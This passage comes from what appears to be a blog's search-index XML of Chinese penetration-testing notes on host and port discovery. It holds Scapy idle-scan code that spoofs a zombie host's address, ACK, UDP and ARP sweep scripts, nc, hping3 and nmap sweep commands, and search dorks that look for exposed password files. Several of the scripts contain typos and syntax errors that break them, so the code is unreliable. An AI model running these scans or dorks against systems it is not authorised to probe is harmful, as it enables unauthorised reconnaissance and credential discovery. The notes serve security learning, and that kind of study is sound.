-z 192.168.254.254 1-100for x in $(seq 20 30); do nc -nv -w 1 -z 1.1.1.1 $x; done | grep openfor xin $(seq 1 254); do nc -nv -w 1 -z 1.1.1.$x 80; done</code></pre><blockquote><h3 id="僵尸扫描"><a href="#僵尸扫描" class="headerlink" title="僵尸扫描"></a><strong>僵尸扫描</strong></h3></blockquote><h5 id="Scapy-1"><a href="#Scapy-1" class="headerlink" title="Scapy"></a><strong>Scapy</strong></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">i&#x3D;IP()</span><br><span class="line">t&#x3D;TCP()</span><br><span class="line">rz&#x3D;(i&#x2F;t)</span><br><span class="line">rt&#x3D;(i&#x2F;t)</span><br><span class="line">rz[IP].dst&#x3D;IPaddr</span><br><span class="line">rz[TCP].dport&#x3D;445</span><br><span class="line">rz[TCP].flags&#x3D;&quot;SA&quot;</span><br><span class="line">rt[IP].src&#x3D;IPaddr </span><br><span class="line">rt[IP].dst&#x3D;IPaddr</span><br><span class="line">rt[TCP].dport&#x3D;22</span><br><span class="line">rt[TCP].flags&#x3D;&quot;S&quot;</span><br><span class="line">az1&#x3D;sr1(rz)&#x2F;at&#x3D;sr1(rt,timeout&#x3D;1)&#x2F;az2&#x3D;sr1(rz)</span><br><span class="line">az1.display()&#x2F;az2.display()</span><br></pre></td></tr></table></figure><h5 id="Python-zombie-py"><a href="#Python-zombie-py" class="headerlink" title="Python ./zombie.py"></a><strong>Python</strong> <code>./zombie.py</code></h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line">logging.getLogger(<span class="string">"scapy.runtime"</span>).setLevel(logging.ERROR)</span><br><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ipid</span><span class="params">(zombie)</span>:</span></span><br><span class="line">reply1=sr1(IP(dst=zombie)/TCP(flags=<span class="string">"SA"</span>),timeout=<span class="number">2</span>,verbose=<span class="number">0</span>)</span><br><span class="line">send(IP(dst=zombie)/TCP(flags=<span class="string">"SA"</span>),verbose=<span class="number">0</span>)</span><br><span class="line">reply2=sr1(IP(dst=zombie)/TCP(falgs=<span class="string">"SA"</span>),timeout=<span class="number">2</span>,verbose=<span class="number">0</span>)</span><br><span class="line"><span class="keyword">if</span> reply2[IP].id==(reply1[IP].id+<span class="number">2</span>):</span><br><span class="line"><span class="keyword">print</span> <span class="string">"IPID sequence is incremental and target appears to be idle, ZOMBIE LOCATED"</span></span><br><span class="line">response=raw_input(<span class="string">"Do you want to use this zombie to perform a scan? (Y or N):"</span>)</span><br><span class="line"><span class="keyword">if</span> response==<span class="string">"Y"</span>:</span><br><span class="line">target=raw_input(<span class="string">"Enter the IP address of the target system:"</span>)</span><br><span class="line">zombiescan(target.zombie)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Enter the IPID sequence is not incremental or the target is not idle. NOT A GOOD ZOMBIE"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">zombiescan</span><span class="params">(target,zombie)</span>:</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"\nScanning target "</span>+target+<span class="string">"with zombie"</span>+zombie</span><br><span class="line"><span class="keyword">print</span> <span class="string">"\n------Open Ports on Target------\n"</span></span><br><span class="line"><span class="keyword">for</span> port <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">atart_val=sr1(IP(dst=zombie)/TCP(flags=<span class="string">"SA"</span>,dport=port),timeout=<span class="number">2</span>,verbose=<span class="number">0</span>)</span><br><span class="line">send(IP(src=zombie,dst=target)/TCP(flags=<span class="string">"S"</span>,dport=port),verbose=<span class="number">0</span>)</span><br><span class="line">end_val=sr1(IP(dst=zombie)/TCP(flags=<span class="string">"SA"</span>),timeout=<span class="number">2</span>,verbose=<span class="number">0</span>)</span><br><span class="line"><span class="keyword">if</span> end_val[IP].id==(start_val[IP].id+<span class="number">2</span>):</span><br><span class="line"><span class="keyword">print</span> port</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"---------Zombie Scan Suite---------\n"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"1 - Identify Zombie Host\n"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"2 - Perform Zombie Scan\n"</span></span><br><span class="line">ans=raw_input(<span class="string">"Select an Option (1 or 2):"</span>)</span><br><span class="line"><span class="keyword">if</span> ans==<span class="string">"1"</span>:</span><br><span class="line">zombie=raw_input(<span class="string">"Enter IP address to test IPID sequence:"</span>)</span><br><span class="line">ipid(zombie)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">if</span> ans==<span class="string">"2"</span>:</span><br><span class="line">zombie=raw_input(<span class="string">"Enter IP address for zombie system:"</span>)</span><br><span class="line">target=raw_input(<span class="string">"Enter IP address for scan target:"</span>)</span><br><span class="line">zombiescan(target,zombie)</span><br></pre></td></tr></table></figure><h4 id="nmap-僵尸扫描"><a href="#nmap-僵尸扫描" class="headerlink" title="nmap 僵尸扫描"></a><strong>nmap</strong> 僵尸扫描</h4><p>发现僵尸机</p><pre><code>nmap -p445 192.168.254.254 --script=ipidseq.nse</code></pre><p>扫描目标</p><pre><code>nmap 1.1.1.1 -sl 1.1.1.2 -Pn -p 0-100</code></pre>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 信息收集 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> nmap </tag>
            
            <tag> Scapy </tag>
            
            <tag> nc </tag>
            
            <tag> hping3 </tag>
            
            <tag> 端口扫描 </tag>
            
            <tag> 僵尸扫描 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Transport四层发现</title>
      <link href="/2013/03/17/Information_Gethering/Transport%E5%9B%9B%E5%B1%82%E5%8F%91%E7%8E%B0/"/>
      <url>/2013/03/17/Information_Gethering/Transport%E5%9B%9B%E5%B1%82%E5%8F%91%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h4 id="优点"><a href="#优点" class="headerlink" title="优点"></a><strong>优点</strong></h4><ul><li>可路由且结果可靠</li><li>不太可能被防火墙过滤</li><li>甚至可以发现所有端口都被过滤的主机<h4 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a><strong>缺点</strong></h4></li><li>基于状态过滤的防火墙可能过滤扫描</li><li>全端口扫描速度慢</li></ul><blockquote><p>TCP<br>    未经请求的ACK–RST<br>    SYN–SYN/ACK，RST</p></blockquote><h5 id="Scapy"><a href="#Scapy" class="headerlink" title="Scapy"></a><strong>Scapy</strong></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">i&#x3D;IP()</span><br><span class="line">i.dst&#x3D;&quot;1.1.1.1&quot;</span><br><span class="line">t&#x3D;TCP()</span><br><span class="line">t.flags&#x3D;&quot;A&quot;</span><br><span class="line">r&#x3D;(i&#x2F;t)</span><br><span class="line">a&#x3D;sr1(r)</span><br><span class="line">a.display()</span><br><span class="line">a&#x3D;sr1(IP(dst&#x3D;&quot;1.1.1.1&quot;)&#x2F;TCP(dport&#x3D;80,flags&#x3D;&quot;A&quot;),timeout&#x3D;1)</span><br></pre></td></tr></table></figure><h4 id="Python-ACK-Ping-py"><a href="#Python-ACK-Ping-py" class="headerlink" title="Python: ACK_Ping.py"></a><strong>Python</strong>: <code>ACK_Ping.py</code></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line">logging.getLogger(<span class="string">"scapy.runtime"</span>)setLevel(logging.ERROR)</span><br><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv)!=<span class="number">2</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Usage - ./ACK_Ping.py [/24 network address]"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Example - ./ACK_Ping.py 1.1.1.0"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Example will preform a TCP ACK ping scan of the 1.1.1.0/24 range"</span></span><br><span class="line">sys.exit()</span><br><span class="line"></span><br><span class="line">address=str(sys.argv[<span class="number">1</span>])</span><br><span class="line">prefix=address.split(<span class="string">'.'</span>)[<span class="number">0</span>]+<span class="string">'.'</span>+address.split(<span class="string">'.'</span>)[<span class="number">1</span>]+<span class="string">'.'</span>+address.split(<span class="string">'.'</span>)[<span class="number">2</span>]+<span class="string">'.'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> addr <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">254</span>):</span><br><span class="line">response=sr1(IP(dst=prefix+str(addr))/TCP(dport=<span class="number">2222</span>,flags=<span class="string">"A"</span>),timeout=<span class="number">0.1</span>,verbose=<span class="number">0</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">if</span> int(response(TCP).flags)=<span class="number">4</span>:</span><br><span class="line"><span class="keyword">print</span> prefix+str(addr)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br></pre></td></tr></table></figure><blockquote><h4 id="UDP"><a href="#UDP" class="headerlink" title="UDP"></a><strong>UDP</strong></h4><p>ICMP端口不可达，一去不复返9<br>    ACK–TCP Port–RST<br>    UDP–UDP Port–ICMP</p></blockquote><h5 id="Scapy-1"><a href="#Scapy-1" class="headerlink" title="Scapy"></a><strong>Scapy</strong></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">u&#x3D;UDP()</span><br><span class="line">u.dport&#x3D;22222</span><br><span class="line">r&#x3D;(i&#x2F;u)</span><br><span class="line">a&#x3D;sr1(r.timeout&#x3D;1,verbose&#x3D;1)</span><br><span class="line">a.display()</span><br><span class="line">a&#x3D;sr1(IP(dst&#x3D;&quot;192.168.254.254&quot;)&#x2F;UDP(dport&#x3D;2222),timeout&#x3D;1)</span><br><span class="line">ICMP</span><br></pre></td></tr></table></figure><h4 id="Python-UDP-Ping-py"><a href="#Python-UDP-Ping-py" class="headerlink" title="Python:UDP_Ping.py"></a><strong>Python</strong>:UDP_Ping.py</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line">logging.getLogger(<span class="string">"scapy.runtime"</span>).setLevel(logging.ERROR)</span><br><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv)!=<span class="number">2</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Usage - ./UDP_Ping.py [/24 network address]"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Example - ./UDP_Ping.py 1.1.1.0"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Example will perform a UDP ping scan of the 1.1.1.0/24 range"</span></span><br><span class="line">sys.exit()</span><br><span class="line"></span><br><span class="line">address=str(sys.argv[<span class="number">1</span>])</span><br><span class="line">prefix=address.split(<span class="string">'.'</span>)[<span class="number">0</span>]+<span class="string">'.'</span>+address.split(<span class="string">'.'</span>)[<span class="number">1</span>]+<span class="string">'.'</span>+address.split(<span class="string">'.'</span>)[<span class="number">2</span>]+<span class="string">'.'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> addr <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">254</span>):</span><br><span class="line">response=sr1(IP(dst=prefix+str(addr))/UDP(dport=<span class="number">22222</span>),timeout=<span class="number">0.1</span>,verbose=<span class="number">0</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">if</span> int(response[IP].proto)==<span class="number">1</span>:</span><br><span class="line"><span class="keyword">print</span> prefix+str(addr)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>UDP发现不可靠</p><h4 id="NMAP"><a href="#NMAP" class="headerlink" title="NMAP"></a><strong>NMAP</strong></h4><pre><code>nmap 1.1.1.1-254 -PU53 -snnmap 1.1.1.1-254 -PA80 -snnmap -iL iplist.txt -PA80 -sn</code></pre><h4 id="hping3"><a href="#hping3" class="headerlink" title="hping3"></a><strong>hping3</strong></h4><p><strong>UDP</strong></p><pre><code>hping3 --udp 1.1.1.1 -c 1for addr in $(seq 1 254); do hping3 --udp 1.1.1.$addr -c 1 &gt;&gt;r.txt; donegrep Unreachable r.txt |cut -d&quot;&quot; -f 5 | cut -d &quot;=&quot; -f 2</code></pre><p>shell脚本: <code>./udp_hping.sh 1.1.1.0</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">if [&quot;$#&quot; -ne 1]; then</span><br><span class="line">echo &quot;Usage - .&#x2F;udp_hping.sh [&#x2F;24 network address]&quot;</span><br><span class="line">echo &quot;Example - .&#x2F;udp_hping.sh 192.168.1.0&quot;</span><br><span class="line">echo &quot;Example will perform a UDP ping sweep of the 1.1.1.0&#x2F;24 network and output to an output.txt file&quot;</span><br><span class="line">exit</span><br><span class="line">fi</span><br><span class="line">prefix&#x3D;$(echo $1 | cut -d &#39;.&#39; -f 1-3)</span><br><span class="line">for addr in $(seq 1 254); do</span><br><span class="line">hping3 $prefix.$addr --udp -c 1 &gt;&gt; r.txt;</span><br><span class="line">done</span><br><span class="line">grep Unreachable r.txt | cut -d &quot; &quot; -f 5 | cut -d &quot;&#x3D;&quot; -f 2 &gt;&gt; output.txt</span><br><span class="line">rm r.txt</span><br></pre></td></tr></table></figure><p><strong>TCP</strong><br>    hping3 1.1.1.1 -c 1 (TCP)<br>    hping3 1.1.1.1</p><p>shell脚本: <code>./TCP_hping.sh</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">if [&quot;$#&quot; -ne 1]; then</span><br><span class="line">echo &quot;Usage - .&#x2F;tcp_hping.sh [&#x2F;24 network address]&quot;</span><br><span class="line">echo &quot;Example - .&#x2F;tcp_hping.sh 192.168.1.0&quot;</span><br><span class="line">echo &quot;Example will perform a TCP ping sweep of the 1.1.1.0&#x2F;24 network and output to an output.txt file&quot;</span><br><span class="line">exit</span><br><span class="line">fi</span><br><span class="line">prefix&#x3D;$(echo $1 | cut -d &#39;.&#39; -f 1-3)</span><br><span class="line">for addr in $(seq 1 254); do</span><br><span class="line">hping3 $prefix.$addr -c 1 &gt;&gt; r.txt;</span><br><span class="line">done</span><br><span class="line">grep ^len r.txt | cut -d &quot; &quot; -f 2 | cut -d &quot;&#x3D;&quot; -f 2 &gt;&gt; output.txt</span><br><span class="line">rm r.txt</span><br></pre></td></tr></table></figure><p>Flag 0–ACK,RST</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 信息收集 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> TCP </tag>
            
            <tag> UDP </tag>
            
            <tag> nmap </tag>
            
            <tag> Scapy </tag>
            
            <tag> hping3 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Network三层发现_路由追踪</title>
      <link href="/2013/03/16/Information_Gethering/Network%E4%B8%89%E5%B1%82%E5%8F%91%E7%8E%B0_%E8%B7%AF%E7%94%B1%E8%BF%BD%E8%B8%AA/"/>
      <url>/2013/03/16/Information_Gethering/Network%E4%B8%89%E5%B1%82%E5%8F%91%E7%8E%B0_%E8%B7%AF%E7%94%B1%E8%BF%BD%E8%B8%AA/</url>
      
        <content type="html"><![CDATA[<blockquote><h3 id="network"><a href="#network" class="headerlink" title="network"></a><strong>network</strong></h3></blockquote><p>优点<br>    可路由<br>    速度比较快<br>缺点<br>    速度比二层慢<br>    经常被边界防火墙过滤<br>IP，icmp协议</p><h4 id="ping"><a href="#ping" class="headerlink" title="ping"></a><strong>ping</strong></h4><pre><code>ping 1.1.1.1 -c 5ping 1.1.1.1 ping 1.1.1.1 -c 1 | grep &quot;bytes from&quot; | cut -d &quot;&quot; -f 4 | cut -d &quot;:&quot; -f 1</code></pre><h4 id="路由追踪"><a href="#路由追踪" class="headerlink" title="路由追踪"></a><strong>路由追踪</strong></h4><pre><code>traceroute 1.1.1.1 ping -R 1.1.1.1</code></pre><h4 id="Scapy"><a href="#Scapy" class="headerlink" title="Scapy"></a><strong>Scapy</strong></h4><pre><code>ip=IP()ip.dst=&quot;1.1.1.1&quot;ping=ICMP()a=sr1(ip/ping)a.display()a=sr1(ip/ping,timeout=1)  #ping不存在的地址sr1(IP(dst=&quot;192.168.254.254&quot;)/ICMP()) #合并</code></pre><h4 id="NMAP"><a href="#NMAP" class="headerlink" title="NMAP"></a><strong>NMAP</strong></h4><pre><code>nmap -sn 1.1.1.1-255 #如果IP在本网段发二层arp包，如果不同网端发icmp包nmap -iL iplist.txt -sn</code></pre><h4 id="fping"><a href="#fping" class="headerlink" title="fping"></a><strong>fping</strong></h4><pre><code>fping 1.1.1.1 -c 1fping -g 1.1.1.1 1.1.1.2fping -g 1.1.1.0/24fping -f iplist.txt</code></pre><h4 id="Hping"><a href="#Hping" class="headerlink" title="Hping"></a><strong>Hping</strong></h4><p>能够发送几乎所有TCP/IP包头<br>功能强大但每次只能扫描一个目标<br>拒绝服务，压力测试<br>    hping3 1.1.1.1 –icmp -c 2<br>    for addr in $(seq 1 254); do hping3 1.1.1.$addr –icmp -c 1 &gt;&gt;handle.txt &amp;done</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 信息收集 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Scapy </tag>
            
            <tag> 路由追踪 </tag>
            
            <tag> traceroute </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ARP协议的数据链路层扫描探测</title>
      <link href="/2013/03/15/Information_Gethering/ARP%E5%8D%8F%E8%AE%AE%E7%9A%84%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82%E6%89%AB%E6%8F%8F%E6%8E%A2%E6%B5%8B/"/>
      <url>/2013/03/15/Information_Gethering/ARP%E5%8D%8F%E8%AE%AE%E7%9A%84%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82%E6%89%AB%E6%8F%8F%E6%8E%A2%E6%B5%8B/</url>
      
        <content type="html"><![CDATA[<p>OSI model (OSI 7层网络模型 )</p><ol start="7"><li>Application</li><li>Presentation</li><li>Session</li><li>Transport</li><li>Network</li><li>Data link (Arp)</li><li>Physical</li></ol><p>Data link (Arp) 二层发现<br>优点：扫描速度块，可靠<br>缺点：不可路由<br>Arp协议<br>抓包</p><pre><code>ifconfigdhclient eth0arping 1.1.1.1 -c 1arping 192.168.1.1 -d #arp欺骗检测</code></pre><blockquote><p>Bash脚本：<code>arping1.sh</code>  #扫描网段</p></blockquote><pre><code>#!/bin/bashif [&quot;$#&quot; -ne 1 ]:then  echo &quot;Usage - ./arping.sh [interface]&quot;  echo &quot;Example - ./arping.sh eth0&quot;  echo &quot;Example will preform an ARP scan of the local subnet to which eth0 is assigned&quot;  exitfiinterface=$1prefix=$(ifconfig $interface | grep &apos;inet addr&apos; | cut -d &apos;:&apos; -f 2 | cut -d &apos; &apos; -f 1 | cut -d &apos;.&apos; -f 1-3)for addr in $(seq 1 254); do  arping -c 1 $prefix.$addr | grep &quot;bytes from&quot; | cut -d&quot; &quot; -f 5 | cut -d&quot;(&quot; -f 2 | cut -d&quot;)&quot; -f 1done</code></pre><blockquote><p>NMAP</p></blockquote><pre><code>nmap 191.168.1.1-254 -sn    or    nmap 192.168.1.0/24 -snnmap -iL iplist.txt -sn</code></pre><blockquote><p>Netdiscover</p></blockquote><p>专用于二层发现<br>可用于无线和交换网络环境<br>主动肯被动探测</p><pre><code>主动：    netdiscover -i eth0 -r 1.1.1.0/24    netdiscover -l iplist.txt被动：    netdiscover -p     主动arp容易触发报警</code></pre><blockquote><p>Scapy</p></blockquote><pre><code>作为Python库进行调用也可作为单独工具使用抓包，分析，创建，修改，注入网络流量apt-get install python-gnuplotScapy    ARP().display()    Sr1()</code></pre><blockquote><p>Python脚本:<code>Arp1.py</code> </p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line">logging.getLogger(<span class="string">"scapy.runtime"</span>).setLevel(logging.ERROR)</span><br><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv)!=<span class="number">2</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Usage - ./arp_disc.py [interface]"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Example - ./arp_disc.py eth0"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"example will perform an ARP scan of the local subnet to which eht0 is assigned"</span></span><br><span class="line">sys.exit()</span><br><span class="line"></span><br><span class="line">interface=str(sys.argv[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">ip=subprocess.check_output(<span class="string">"ifconfig"</span>+interface+<span class="string">" | grep 'inet addr' | cut -d ':' -f 2 | cut -d ' ' -f 1"</span>,shell=<span class="literal">True</span>).strip()</span><br><span class="line">prefix=ip.split(<span class="string">'.'</span>)[<span class="number">0</span>]+ip.split(<span class="string">'.'</span>)[<span class="number">1</span>]+<span class="string">'.'</span>+ip.split(<span class="string">'.'</span>)[<span class="number">2</span>]+<span class="string">'.'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> addr <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">254</span>):</span><br><span class="line">answer=sr1(ARP(pdst=prefix+str(addr)),timeout=<span class="number">0.1</span>,verbose=<span class="number">0</span>)</span><br><span class="line"><span class="keyword">if</span> answer==<span class="literal">None</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">print</span> prefix+str(addr)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 信息收集 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 主动信息收集 </tag>
            
            <tag> 扫描开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Search Hacking信息收集姿势</title>
      <link href="/2013/03/12/Information_Gethering/Search%20Hacking%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%A7%BF%E5%8A%BF/"/>
      <url>/2013/03/12/Information_Gethering/Search%20Hacking%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%A7%BF%E5%8A%BF/</url>
      
        <content type="html"><![CDATA[<blockquote><p>SHODAN</p></blockquote><pre><code>net:8.8.8.8    or net:8.8.8.0/24 country:CN city:beijing port:22os:&quot;windows&quot;server:apachehostname:google.com</code></pre><p>example:<br>200 OK cisco country:JP<br>user:amdin pass:password<br>linux upnp avtech</p><blockquote><p>google hacking</p></blockquote><p><a href="https://www.exploit-db.com/google-hacking-database" target="_blank" rel="noopener">GHDB</a></p><pre><code>title:关键字 indext:关键字 indext:关键字inurl:/../../inurl:/admin/login.phpinurl:qq.txtinurl:ftp &quot;password&quot; filetype:xls inurl:service.pwdfiletype:xls &quot;username | password&quot;intitle:&quot;netbotz appliance&quot; &quot;ok&quot;</code></pre><blockquote><p>theHarvester （并发多引擎搜索）<br>metagoofil    (并发多引擎文件搜索)<br>Maltego</p></blockquote><p>CUPP– common User Password Proliler (根据用户信息生成密码字典)</p><pre><code>git clone https://github.com/Mebus/cupp.git</code></pre><blockquote><p>METADATA图片源信息查看</p></blockquote><p>exiftool x.jpg  #查看图片exif信息<br>foca            #windows查看图片源数据工具</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 信息收集 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 被动信息收集 </tag>
            
            <tag> SHODAN </tag>
            
            <tag> GOOGLE HACKING </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTTP协议简介</title>
      <link href="/2013/03/12/Web_Attacks/http%E5%8D%8F%E8%AE%AE%E7%AE%80%E4%BB%8B/"/>
      <url>/2013/03/12/Web_Attacks/http%E5%8D%8F%E8%AE%AE%E7%AE%80%E4%BB%8B/</url>
      
